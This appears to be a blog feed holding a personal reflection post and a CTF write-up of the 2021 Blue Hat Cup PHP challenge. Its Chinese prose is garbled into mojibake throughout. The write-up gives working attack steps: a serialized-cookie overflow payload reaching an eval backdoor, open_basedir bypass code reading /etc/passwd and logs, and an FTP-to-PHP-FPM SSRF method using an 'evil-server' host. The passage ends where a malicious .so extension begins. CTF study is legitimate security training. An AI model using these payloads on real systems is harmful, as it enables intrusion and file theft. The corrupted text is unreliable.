ä¸ºçº¯ç²¹çš„æ‡’ï¼Œå¤§å­¦çš„æ—¶å€™æ˜¯æ„Ÿè§‰é‚£äº›ä½œä¸šç¡®å®æ˜¯åšäº†æ²¡ç”¨ï¼Œè™½ç„¶å½’æ ¹ç»“åº•è¿˜æ˜¯æ‡’ï¼Œä½†æ¯•ç«ŸğŸ‘´ä¹Ÿä¸€ç›´ä¸æ˜¯ä¸ªå¬è¯çš„å¥½å­©å­ï¼Œæ‰€ä»¥æ— æ‰€è°“äº†ã€‚</p><p>ä¸€ç›´éƒ½æŒºæ²¡å¿ƒæ²¡è‚ºï¼Œå°å­¦æ˜¯ï¼Œåˆä¸­æ˜¯ï¼Œé«˜ä¸­æœ‰æ”¹å˜ï¼Œä½†æ˜¯ä¹Ÿç¡®å®æ˜¯è¿™æ ·ï¼Œç›´åˆ°ç°åœ¨ä¹Ÿä¼šå¶å°”çŠ¯ç—…ï¼Œä¸è¿‡æ€»å½’æ˜¯æ²¡å°æ—¶å€™é‚£ä¹ˆæ²¡è¡€äº†ã€‚æ€ä¹ˆè¯´å‘¢ï¼Œé«˜ä¸­æ˜¯è½¬å˜æœ€å¤§çš„ä¸€æ®µæ—¶æœŸï¼Œé‡åˆ°äº†ä¸€ç¾¤ä¸€è¾ˆå­çš„å¥½å…„å¼Ÿï¼Œç‹æœ‹ç‹—å‹ç¡®å®ä¹Ÿä¸è¿‡å¦‚æ­¤ï¼Œä¹Ÿæ„Ÿè°¢ @æ•™æˆ @å…¸å“¥ @æ ‘æ–‡ @ å½­å…‹ @å£ @ly @404 @504 ä½ ä»¬è¿™ç¾¤é€†å¤©èµäºˆäº†æˆ‘ <code>å †</code> è¿™ä¸ªåå­—ï¼Œæˆ‘ä»¥åä¹Ÿä¼šä¸€ç›´å¸¦ç€ï¼Œç¡®å®è¢«å«æƒ¯äº†å †å †ï¼Œåœ¨å¤§å­¦çš„æ—¶å€™æˆ‘ä¹Ÿè®©å‘¨å›´çš„äººå«æˆ‘å †å †ï¼Œä»¥åå…¥åœŸä¸ºå®‰ï¼ŒæŠŠå®ƒå†å¸¦åˆ°ä¸‹é¢å»ï¼ŒæŒºå¥½ã€‚</p><p>æ€€å¿µæ¯ä¸ªä¸‹è¯¾å’Œå£å“¥å†²åˆ°äºŒæ¥¼çƒæ¡Œç‹ æŠ½å‡ çƒçš„é«˜ä¸€ï¼›éš”ä¸‰å²”äº”å°±å’Œæ•™æˆã€lyã€å°ä¸ç‚¹åœ¨å•æ‰€æ·±å¤œé—²è°ˆï¼›ä¸ºè‡ªå·±æŸæ¬¡è¶…å¸¸å‘æŒ¥çš„è‹±è¯­æ²¾æ²¾è‡ªå–œï¼›é«˜ä¸‰ä¸‹äº†è¿˜ä¸å¿˜é€ƒè¯¾å»æ‰“ç¯®çƒï¼Œè¢«æŠ“ä½å·®ç‚¹è®°ä¸ªå¤„åˆ†ï¼Œç”šè‡³ç¬¬ä¸€æ¬¡è¿›ç½‘å§ï¼Œä¹Ÿæ˜¯é«˜ä¸‰ä¸‹ã€‚å›å‘³èµ·æ¥è¿˜æŒºæœ‰æ„æ€ï¼Œé«˜ä¸€ä¸Šçš„æ—¶å€™æ¯æ™šéƒ½ä¼šå’Œå£å“¥ç™¾ç±³å†²åˆºè·‘åˆ°é‚£é‡Œå»åƒä¸€ç¢—æ¯”ç™½å¤©å¥½åƒå¤šäº†çš„è›‹ç‚’é¥­ï¼Œä¸´èµ°çš„æ—¶å€™æç‚¹ç«è…¿ï¼Œç®€ç›´å°±æ˜¯æœ€å¥½åƒçš„å¤œå®µã€‚</p><p>ä¹Ÿç»å¸¸ä¼šé—®é—®è‡ªå·±ï¼Œä»¥åæƒ³å¹²ä»€ä¹ˆï¼Œæœ›ç€ä¸è®¨å–œçš„æˆç»©ä¹Ÿæœ‰ä¸ç”˜å •è½ï¼Œé«˜ä¸‰çš„æ—¶å€™ç¡¬æ˜¯æŒ¤è¿›äº†æ‰€è°“çš„ç²¾è‹±ç­ï¼Œéšç¼˜è€ƒè¯•ï¼Œæˆç»©æœ‰å¥½æœ‰åï¼Œä½†åæ­£é«˜è€ƒæ˜¯ä¸å¥½å°±å®Œäº‹äº†ã€‚é«˜è€ƒä¹‹åçš„é‚£æ®µæ—¶é—´ç¡®å®æ˜¯æœ€å¥½ç©çš„æ—¶é—´ï¼Œæ¯å¤©å‡ºé—¨ç–¯ï¼Œé«˜è€ƒå‰åˆ¶å®šçš„ä¹¦å•è®¡åˆ’ä¹Ÿæ˜¯ä¸Šäº†å¤§å­¦æ‰æƒ³èµ·æ¥æœ‰è¿™ä¹ˆä¸€å›äº‹ï¼Œå’Œå…„å¼Ÿä»¬ä¸€èµ·å»äº†æ¡‚æ—ã€æµ·å—ç©ï¼Œæƒ³æ¥ï¼Œè¿™ç¾¤ç‹æœ‹ç‹—å‹ï¼Œä¼¼ä¹çœŸæ˜¯åƒé‡‘éš¾æ¢å§ã€‚</p><p><img src="https://i.loli.net/2021/05/01/iAO5pkrBnPWVMU3.jpg" alt="æ¡‚æ—é˜³æœ”"></p><p>å¤§ä¸€ä¸ŠæœŸçš„æ—¶å€™ï¼Œå¬ç€è€çˆ·å­çš„æŠ¥äº†è®¡ç®—æœºï¼Œä¸€å¼€å§‹ä¹Ÿåªæ˜¯æƒ³ç€å°±é‚£æ ·å­¦å­¦å§ï¼Œæ··ç€å®Œäº‹äº†ï¼Œä¸è¿‡é‡åˆ°äº†å¥¹ä¹‹åï¼Œä¾¿å’Œè‡ªå·±è¾ƒä¸Šäº†åŠ²æ¥ï¼Œä¸å†ç©æ¸¸æˆï¼Œä¹Ÿä¸å‚åŠ æ‰€è°“çš„å¨±ä¹æ´»åŠ¨ï¼Œæœ€å¼€å§‹çš„æ—¶å€™å§ï¼Œæ‹¼å‘½å­¦ ACMï¼Œå°±ä¸ºäº†å¯ä»¥æ¯”è¿™ä¸ªå¥³å­©å­æ›´å¼ºï¼Œâ€œğŸ‘´ä¸èƒ½è®©ä¸€ä¸ªå¥³å­©å­æ’‘æˆ‘ä»¬ç­çš„ç‰Œé¢â€ï¼Œä¹Ÿæˆäº†å½“æ—¶ğŸ‘´å­¦ä¹ çš„ä¸€ä¸ªâ€œå€Ÿå£â€ï¼Œ23333ã€‚åæ¥å’Œå¥¹ä¸€èµ·è¿›äº†å®éªŒå®¤ï¼ŒæŠŠå¥¹çš„æ‰‹æ¡åœ¨æ‰‹é‡Œï¼Œä¸¤ä¸ªäººä¸€èµ·è®¡åˆ’ç€æœªæ¥ï¼Œè®¨è®ºç€è¦ä¸€èµ·åŠªåŠ›ï¼Œè¿™äº›å°±æˆäº†ğŸ‘´å­¦ä¹ æœ€å¤§çš„åŠ¨åŠ›ã€‚</p><p>æ¥è§¦ç½‘å®‰ä¹Ÿä¾¿æ˜¯ä»è¿›å®éªŒå®¤å¼€å§‹çš„ï¼Œæ¥åˆ°äº† 508ï¼Œé‡åˆ°äº†ä¸€ç¾¤å¿—åŒé“åˆçš„ hxdï¼ˆæŒ‡å¹²é¥­ï¼‰ï¼Œå¿˜ä¸äº†å’Œå“å“¥åœ¨å°é»‘å±‹é‡Œé¢ç‹‚å¹²è¯¾è®¾ï¼Œä¸€åˆ‡åƒå¤œå®µï¼›å’Œè€è°¢è€ç§¦å»æ¯”èµ›çº¿ä¸‹é€šå®µæ‰“è”ç›Ÿï¼ˆè™½ç„¶ğŸ‘´å…ˆæºœäº†ï¼‰ï¼Œäº‹åå¬è¯´è€æ¨Šéª‚äº†ä¸€æ™šä¸Šäººï¼ˆç¬‘æ­»ï¼‰ï¼›å’Œç»„é‡Œèšä¸ªå°ä¼šå–å¤šäº†é…’ï¼Œè¢«ä¸€ç¾¤äººçœ‹ç€è·Œè·Œæ’æ’è·‘å›å¯å®¤ï¼Œå¤šæœˆä¹‹åè¿˜å¸®å¿™å›å¿†ï¼ˆä¸¢è„¸ï¼‰ã€‚</p><p>åæ¥å¤§ä¸€ä¸‹æœŸçš„ç–«æƒ…ï¼Œä¸€ç›´å¾…åœ¨å®¶é‡Œï¼ŒçŠ¶æ€è¢«æ¶ˆç£¨æ®†å°½ï¼Œåˆå˜å¾—æ‡’ä¸”æ„šé’ï¼Œåˆå¼€å§‹æ‰“æ¸¸æˆï¼Œç›´åˆ°å¤§äºŒçš„ä¸‹æœŸæ‰ç¼“è¿‡æ¥ï¼Œåˆæ¡èµ·å­¦å¾—ä¸€çŸ¥åŠè§£çš„ä¸€è‚šå­åŠåŠå­å­¦é—®ï¼Œæ²‰äº†æ²‰å¿ƒå»å­¦ï¼Œæ„Ÿè§‰è¿™æ‰å«å­¦åˆ°äº†ä¸œè¥¿ï¼Œä»¥å‰çš„é‚£äº›æµ®åœ¨å¤©ä¸Šçš„å­¦ä¹ ï¼ŒåŠæ¡¶æ°´çš„è‡ªå·±ï¼Œæ ¹æœ¬å•¥ä¹Ÿä¸ä¼šã€‚å¾ˆå–œæ¬¢è°­æ€»çš„ä¸€å¥è¯ï¼šâ€œä½ æœ‰ç‚¹æµ®èºäº†â€ï¼Œç¡®å®æ˜¯å¾ˆæµ®èºäº†ï¼Œæ‰€ä»¥è¿˜æ˜¯è¦ç»§ç»­é™ä¸‹å¿ƒå»å­¦ï¼Œä¸èƒ½å†é€ƒé¿äº†ã€‚</p><p>æ¥ä¸‹æ¥çš„è¯ï¼Œå¸Œæœ›è‡ªå·±å¯ä»¥æ²‰ç¨³ä¸€ç‚¹ï¼Œä¹Ÿè¦å¿«å¿«å­¦åˆ°æ›´å¤šçŸ¥è¯†ï¼Œå¸¦å¥½é“ä¸‰å’Œå›½èµ›ï¼Œæƒ³å¹²çš„äº‹å°±å»å¹²ï¼Œæƒ³è¦åšæŒçš„åšå®¢ä¹Ÿè¦ä¸€ç›´æ›´ï¼Œä¸è¦å†åƒä»¥å‰é‚£æ ·å–œæ¬¢åšé¸½å­ï¼Œå–œæ¬¢æâ€œæ‹–ï¼Œå°±ç¡¬æ‹–â€äº†ã€‚</p><hr><p>@å“å“¥ @è€ç§¦ @åœ†å­ @è²å§ @æ³½è¾° @è€è°¢ @è€æ¨Š @æ”¾æ”¾ï¼Œæ²¡å•¥äº‹ï¼Œå°±å•çº¯æƒ³ @ ä½ ä»¬ä¸€ä¸‹ï¼Œä»¥åç»§ç»­ä¸€èµ·å¥½å¥½å¹²é¥­ï¼ˆbushiï¼Œå¥½å¥½åŠªåŠ›ï¼‰ï¼Œç›¸ä¿¡ 508 çš„å¹²é¥­ä¹‹é­‚ä¼šè¶Šæ¥è¶Šç››ï¼Œç›´åˆ°çªç ´åœ°å¹³çº¿ï¼Œè¶…è¶Šé“¶æ²³ç³»ã€‚</p><p>@515 å¤§å®¶éƒ½æ˜¯å®ä¹¡çš„é€†å¤©ï¼Œè¿˜æœ‰ä¸¤å¹´ï¼Œåæ­£å°±æ˜¯è¦èµ–ç€ç»§ç»­éº»çƒ¦ä½ ä»¬è¿™ç¾¤ç‹—å„¿å­äº†ï¼Œè¿˜æœ‰ä¸Šäº†å¤§å­¦è¿˜å¯ä»¥é‡åˆ° @ly ä½ è¿™ä¸ªé€†å¤©åšåŒå­¦åšå®¤å‹ï¼Œç¡®å®æ™¦æ°”ã€‚</p><p>@ä½³ é‡åˆ°äº†ä½ ï¼Œæ˜¯ğŸ‘´æœ€å¹¸è¿ï¼Œä¹Ÿæ˜¯ğŸ‘´æœ€å¹¸ç¦çš„äº‹æƒ…ï¼ŒJe tâ€™aime pour toujours.</p>]]></content>
      
      
      
        <tags>
            
            <tag> æ‚è°ˆ </tag>
            
            <tag> æˆé•¿ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2021_Blue_Hat_WP</title>
      <link href="2021/04/29/2021-Blue-Hat-WP/"/>
      <url>2021/04/29/2021-Blue-Hat-WP/</url>
      
        <content type="html"><![CDATA[<p>æ€ä¹ˆè¯´å‘¢ï¼Œæ¯”èµ›å®‰æ’åœ¨å‘¨å››ï¼Œæ²¡å•¥æ—¶é—´æ‰“ï¼Œé˜Ÿå‹ä»¬éƒ½ä¸Šè¯¾å»äº†ï¼Œæˆ‘å¯å®¤ä¹Ÿæœ‰äº‹æƒ…ï¼Œæ‰€ä»¥è¿™æ¬¡æ¯”èµ›å°±è¿™æ ·äº†ï¼Œæ‰“å¾—ä¸å¥½ï¼Œä½†æ˜¯èµ›åè¿˜æ˜¯è¦å¤ç°ä¸€ä¸‹ã€‚</p><h2 id="web1-Ball-sigin"><a href="#web1-Ball-sigin" class="headerlink" title="web1 Ball_sigin"></a>web1 Ball_sigin</h2><p>ç­¾åˆ°é¢˜ï¼Œjs æ¸¸æˆï¼Œæ²¡çœ‹ã€‚</p><p>çœŸçš„æ˜¯ç©æ¸¸æˆï¼Œæ²¡äº‹äº†ã€‚</p><h2 id="web2-one-Pointer-php"><a href="#web2-one-Pointer-php" class="headerlink" title="web2 one_Pointer_php"></a>web2 one_Pointer_php</h2><p>phpï¼Œæœ€ç»ˆç›®çš„ disable_functionï¼Œä¸ä¼šï¼Œç­‰ä¸€æ³¢èµ›å WP å¤ç°äº†ã€‚</p><p><code>user.php</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">User</span></span>&#123;</span><br><span class="line"><span class="keyword">public</span> <span class="variable">$count</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><code>add_api.php</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">&quot;user.php&quot;</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$user</span>=unserialize(<span class="variable">$_COOKIE</span>[<span class="string">&quot;data&quot;</span>]))&#123;</span><br><span class="line"><span class="variable">$count</span>[++<span class="variable">$user</span>-&gt;count]=<span class="number">1</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$count</span>[]=<span class="number">1</span>)&#123;</span><br><span class="line"><span class="variable">$user</span>-&gt;count+=<span class="number">1</span>;</span><br><span class="line">setcookie(<span class="string">&quot;data&quot;</span>,serialize(<span class="variable">$user</span>));</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line"><span class="keyword">eval</span>(<span class="variable">$_GET</span>[<span class="string">&quot;backdoor&quot;</span>]);</span><br><span class="line">&#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line"><span class="variable">$user</span>=<span class="keyword">new</span> User;</span><br><span class="line"><span class="variable">$user</span>-&gt;count=<span class="number">1</span>;</span><br><span class="line">setcookie(<span class="string">&quot;data&quot;</span>,serialize(<span class="variable">$user</span>));</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>å¯ä»¥æ³¨æ„åˆ°æˆ‘ä»¬éœ€è¦æ‰§è¡Œ evalï¼Œä½†æ˜¯æˆ‘ä»¬å…ˆè¦ä½¿ <code>$count=1</code> è¿”å›ä¸€ä¸ª falseï¼Œæ€æ ·æ‰èƒ½è®©ä¸€ä¸ªä¸æ˜¯èµ‹ 0 çš„èµ‹å€¼è¯­å¥è¿”å› false å‘¢â€¦â€¦</p><p>æƒ³åˆ°äº†æº¢å‡ºï¼Œå…³äº <code>$count[]=1</code>ï¼Œæˆ‘ä»¬å¯ä»¥å‘ç°è¿™æ ·ä¸€ä¸ªæœ‰è¶£çš„ç°è±¡ï¼š</p><p><img src="http://i.loli.net/2021/04/29/IetDslwnc62dPm5.png"></p><p>å¯ä»¥è§‚å¯Ÿåˆ° <code>$count[]=2</code>ï¼Œä¼šæ•°ç»„çš„ä»æœ€åä¸€ä½ä½ç½®å‘å addï¼Œæ‰€ä»¥å¦‚æœæˆ‘ä»¬ä½¿ç”¨ php max long çš„è¯ï¼Œåº”è¯¥å¯ä»¥ä½¿è¿”å›å‡ºç°é—®é¢˜ä»è€Œç»•è¿‡ <code>if($count[]=1)</code></p><p><img src="https://i.loli.net/2021/04/29/wtO6uyTjIdQS84C.png"></p><p>å¯ä»¥å‘ç°ç¡®å®æŠ¥é”™äº†ï¼Œæ‰€ä»¥æˆ‘ä»¬å¯ä»¥å¼€å§‹ eval äº†ï¼Œæ„é€  dataï¼š</p><p><code>O%3A4%3A%22User%22%3A1%3A%7Bs%3A5%3A%22count%22%3Bi%3A9223372036854775806%3B%7D</code></p><p><img src="https://i.loli.net/2021/04/29/YEx4eDXmy8AbfrL.png"></p><p>successï¼Œokï¼Œçœ‹çœ‹ <code>disable_function</code> å§ï¼š</p><p><img src="https://i.loli.net/2021/04/29/LCEiHt2A3NUDTsP.png"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">disable_classes: Exception,SplDoublyLinkedList,Error,ErrorException,ArgumentCountError,ArithmeticError,AssertionError,DivisionByZeroError,CompileError,ParseError,TypeError,ValueError,UnhandledMatchError,ClosedGeneratorException,LogicException,BadFunctionCallException,BadMethodCallException,DomainException,InvalidArgumentException,LengthException,OutOfRangeException,PharException,ReflectionException,RuntimeException,OutOfBoundsException,OverflowException,PDOException,RangeException,UnderflowException,UnexpectedValueException,JsonException,SodiumException</span><br><span class="line">disable_functions: stream_socket_client,fsockopen,putenv,pcntl_alarm,pcntl_fork,pcntl_waitpid,pcntl_wait,pcntl_wifexited,pcntl_wifstopped,pcntl_wifsignaled,pcntl_wifcontinued,pcntl_wexitstatus,pcntl_wtermsig,pcntl_wstopsig,pcntl_signal,pcntl_signal_get_handler,pcntl_signal_dispatch,pcntl_get_last_error,pcntl_strerror,pcntl_sigprocmask,pcntl_sigwaitinfo,pcntl_sigtimedwait,pcntl_exec,pcntl_getpriority,pcntl_setpriority,pcntl_async_signals,iconv,system,exec,shell_exec,popen,proc_open,passthru,symlink,link,syslog,imap_open,dl,mail,error_log,debug_backtrace,debug_print_backtrace,gc_collect_cycles,array_merge_recursive</span><br></pre></td></tr></table></figure><p>å¥½ç‹ ï¼Œä¹‹å‰ @LemonPrefect å¸ˆå‚…å’ŒğŸ‘´è¯´ä»–è§‰å¾—å¯ä»¥è¯•è¯•åå°„ç±»ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> ReflectionClass(system(<span class="string">&#x27;calc&#x27;</span>)()) ;</span><br><span class="line"><span class="variable">$count</span>[++<span class="variable">$a</span>]=<span class="number">1</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$count</span>[]=<span class="number">1</span>)&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;No&quot;</span>;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;Yes&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ä¸è¿‡ <code>disable_classes</code> é‡Œé¢æŠŠèƒ½å°çš„éƒ½å°äº†ï¼Œæ‰€ä»¥æ²¡åŠæ³•ï¼Œåªèƒ½ç»• df äº†ï¼Œå®³ï¼Œä¸ä¼šäº†ã€‚</p><p>å¯ä»¥é€šè¿‡ <code>DirectoryIterator</code> åˆ—å‡ºç›®å½•ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$a</span>=<span class="keyword">new</span> <span class="built_in">DirectoryIterator</span>(<span class="string">&quot;glob:///*&quot;</span>);<span class="keyword">foreach</span>(<span class="variable">$a</span> <span class="keyword">as</span> <span class="variable">$f</span>)&#123; <span class="keyword">echo</span>(<span class="variable">$f</span>-&gt;__toString().<span class="string">&#x27;&lt;br&gt;&#x27;</span>); &#125;</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2021/04/30/3geAkJQvWsECufP.png"></p><p>å¾ˆç¥å¥‡çš„æ˜¯æƒ³è¦åˆ—å‡º /tmp çš„æ—¶å€™å¦‚æœä¸ç”¨å½¢å¦‚ <code>$a=new DirectoryIterator(&quot;glob:///*mp/*&quot;);foreach($a as $f)&#123; echo($f-&gt;__toString().&#39;&lt;br&gt;&#39;); &#125;</code> è¿™æ ·å­ï¼Œè€Œæ˜¯ç›´æ¥ /tmp çš„è¯ä¼šè¯»ä¸å‡ºï¼ˆä¸è§£ï¼‰</p><p><img src="https://i.loli.net/2021/05/03/9s7cSGupkoy3UmY.png"></p><p>æœ‰ <code>open_basedir</code>ï¼Œç»•ä¸€ä¸‹å¯ä»¥è¯»å–ä¸€äº›åŸºæœ¬æ–‡ä»¶ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">mkdir(<span class="string">&#x27;Du1&#x27;</span>);</span><br><span class="line">chdir(<span class="string">&#x27;Du1&#x27;</span>);</span><br><span class="line">ini_set(<span class="string">&#x27;open_basedir&#x27;</span>,<span class="string">&#x27;..&#x27;</span>);</span><br><span class="line">chdir(<span class="string">&#x27;..&#x27;</span>);chdir(<span class="string">&#x27;..&#x27;</span>);chdir(<span class="string">&#x27;..&#x27;</span>);</span><br><span class="line">chdir(<span class="string">&#x27;..&#x27;</span>);chdir(<span class="string">&#x27;..&#x27;</span>);chdir(<span class="string">&#x27;..&#x27;</span>);chdir(<span class="string">&#x27;..&#x27;</span>);</span><br><span class="line">ini_set(<span class="string">&#x27;open_basedir&#x27;</span>,<span class="string">&#x27;/&#x27;</span>);</span><br><span class="line">var_dump(file_get_contents(<span class="string">&quot;/etc/passwd&quot;</span>));</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2021/04/30/WM2oOZxlL6GhHQ9.png"></p><p>flag è¯»ä¸äº†ï¼Œå‚è€ƒäº† <a href="https://ha1c9on.top/2021/04/29/lmb_one_pointer_php/#i-5">@HA1C9ON</a> å¤§ä½¬çš„åšå®¢å‘ç°è¯»å– <code>php.ini</code> å¯ä»¥å‘ç° so æ–‡ä»¶ï¼Œä¸è¿‡ BUU é‡ŒæŠŠè¿™ä¸ªé¢„æœŸè§£åˆ æ‰äº†ï¼Œä½†æ˜¯è¿˜æœ‰åˆ«çš„æ–¹æ³•å¯ä»¥åšã€‚</p><p><img src="https://i.loli.net/2021/04/30/waLhi9n3coeWUAC.png"></p><p>æŸ¥çœ‹ phpinfo çŸ¥é“è¿›ç¨‹ä¸º php-fpmï¼ˆä¹Ÿå¯ä»¥é€šè¿‡ /proc/self/cmdline å¾—çŸ¥ï¼‰</p><p><img src="https://i.loli.net/2021/05/03/m5du2EQf8wChIx9.png"></p><p>è®¿é—®é”™è¯¯æ—¥å¿—ï¼Œå¾—åˆ° FPM ç›‘å¬ç«¯å£ 9001</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">mkdir(<span class="string">&#x27;Du1&#x27;</span>);</span><br><span class="line">chdir(<span class="string">&#x27;Du1&#x27;</span>);</span><br><span class="line">ini_set(<span class="string">&#x27;open_basedir&#x27;</span>,<span class="string">&#x27;..&#x27;</span>);</span><br><span class="line">chdir(<span class="string">&#x27;..&#x27;</span>);chdir(<span class="string">&#x27;..&#x27;</span>);chdir(<span class="string">&#x27;..&#x27;</span>);</span><br><span class="line">chdir(<span class="string">&#x27;..&#x27;</span>);chdir(<span class="string">&#x27;..&#x27;</span>);chdir(<span class="string">&#x27;..&#x27;</span>);chdir(<span class="string">&#x27;..&#x27;</span>);</span><br><span class="line">ini_set(<span class="string">&#x27;open_basedir&#x27;</span>,<span class="string">&#x27;/&#x27;</span>);</span><br><span class="line">var_dump(file_get_contents(<span class="string">&quot;/var/log/nginx/error.log&quot;</span>));</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2021/05/03/uE8vCbDs5nw1oYl.png"></p><hr><p>ä¼—æ‰€å‘¨çŸ¥ï¼Œå¦‚æœæˆ‘ä»¬èƒ½å‘ PHP-FPM æœåŠ¡å‘é€ä¸€ä¸ªä»»æ„çš„äºŒè¿›åˆ¶æ•°æ®åŒ…ï¼Œå°±å¯ä»¥åœ¨æœºå™¨ä¸Šæ‰§è¡Œä»£ç ã€‚è¿™ç§æŠ€æœ¯ç»å¸¸ä¸ gopher:// åè®®ç»“åˆä½¿ç”¨ï¼Œcurl æ”¯æŒ gopher:// åè®®ï¼Œä½† file_get_contents å´ä¸æ”¯æŒã€‚</p><p>å¦ä¸€ä¸ªå·²çŸ¥çš„å…è®¸é€šè¿‡TCPå‘é€äºŒè¿›åˆ¶æ•°æ®åŒ…çš„åè®®æ˜¯FTPï¼Œæ›´å‡†ç¡®çš„è¯´æ˜¯è¯¥åè®®çš„è¢«åŠ¨æ¨¡å¼ï¼Œå³ï¼šå¦‚æœä¸€ä¸ªå®¢æˆ·ç«¯è¯•å›¾ä»FTPæœåŠ¡å™¨ä¸Šè¯»å–ä¸€ä¸ªæ–‡ä»¶ï¼ˆæˆ–å†™å…¥ï¼‰ï¼ŒæœåŠ¡å™¨ä¼šé€šçŸ¥å®¢æˆ·ç«¯å°†æ–‡ä»¶çš„å†…å®¹è¯»å–ï¼ˆæˆ–å†™ï¼‰åˆ°ä¸€ä¸ªç‰¹å®šçš„IPå’Œç«¯å£ä¸Šã€‚è€Œä¸”ï¼Œè¿™é‡Œå¯¹è¿™äº›IPå’Œç«¯å£æ²¡æœ‰è¿›è¡Œå¿…è¦çš„é™åˆ¶ã€‚ä¾‹å¦‚ï¼ŒæœåŠ¡å™¨å¯ä»¥å‘Šè¯‰å®¢æˆ·ç«¯è¿æ¥åˆ°è‡ªå·±çš„æŸä¸€ä¸ªç«¯å£ï¼Œå¦‚æœå®ƒæ„¿æ„çš„è¯ã€‚</p><p>ç°åœ¨ï¼Œç”±äºè¯¥ laravel æ¼æ´ä¸­file_get_contents()å’Œfile_put_contents()è¿™ä¸¤ä¸ªå‡½æ•°åœ¨ä½œç¥Ÿï¼Œå¦‚æœæˆ‘ä»¬å°è¯•ä½¿ç”¨ <code>viewFile=ftp://evil-server/file.txt</code> æ¥åˆ©ç”¨è¿™ä¸ªæ¼æ´ï¼Œä¼šå‘ç”Ÿä»¥ä¸‹æƒ…å†µï¼š</p><ul><li>file_get_contents()è¿æ¥åˆ°æˆ‘ä»¬çš„FTPæœåŠ¡å™¨ï¼Œå¹¶ä¸‹è½½ file.txt</li><li>file_put_contents()è¿æ¥åˆ°æˆ‘ä»¬çš„FTPæœåŠ¡å™¨ï¼Œå¹¶å°†å…¶ä¸Šä¼ å› file.txt</li></ul><p>ç°åœ¨ï¼Œä½ å¯èƒ½å·²ç»çŸ¥é“è¿™æ˜¯æ€ä¹ˆå›äº‹ï¼šæˆ‘ä»¬å°†ä½¿ç”¨FTPåè®®çš„è¢«åŠ¨æ¨¡å¼è®©file_get_contents()åœ¨æˆ‘ä»¬çš„æœåŠ¡å™¨ä¸Šä¸‹è½½ä¸€ä¸ªæ–‡ä»¶ï¼Œå½“å®ƒè¯•å›¾ä½¿ç”¨file_put_contents()æŠŠå®ƒä¸Šä¼ å›å»æ—¶ï¼Œæˆ‘ä»¬å°†å‘Šè¯‰å®ƒæŠŠæ–‡ä»¶å‘é€åˆ°127.0.0.1:9000ã€‚</p><p>è¿™æ ·ï¼Œæˆ‘ä»¬å°±å¯ä»¥å‘ç›®æ ‡ä¸»æœºæœ¬åœ°çš„PHP-FPMå‘é€ä¸€ä¸ªä»»æ„çš„æ•°æ®åŒ…ï¼Œä»è€Œæ‰§è¡Œä»£ç ï¼Œé€ æˆSSRFã€‚</p><hr><p>å¼•ç”¨è‡ª <a href="https://whoamianony.top/2021/01/15/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Laravel/Laravel%20Debug%20mode%20RCE%EF%BC%88CVE-2021-3129%EF%BC%89%E5%88%A9%E7%94%A8%E5%A4%8D%E7%8E%B0/#%E5%88%A9%E7%94%A8FTP%E6%94%BB%E5%87%BBPHP-FPM">Laravel Debug mode RCEï¼ˆCVE-2021-3129ï¼‰æ¼æ´å¤ç°</a></p><p>å°è¯•åŠ è½½æ¶æ„ so æ–‡ä»¶ï¼Œç¼–å†™æ‰©å±•ï¼š</p><p><code>hpdoger.c</code></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> _GNU_SOURCE</span></span><br><span class="line"><span class="meta">#<span 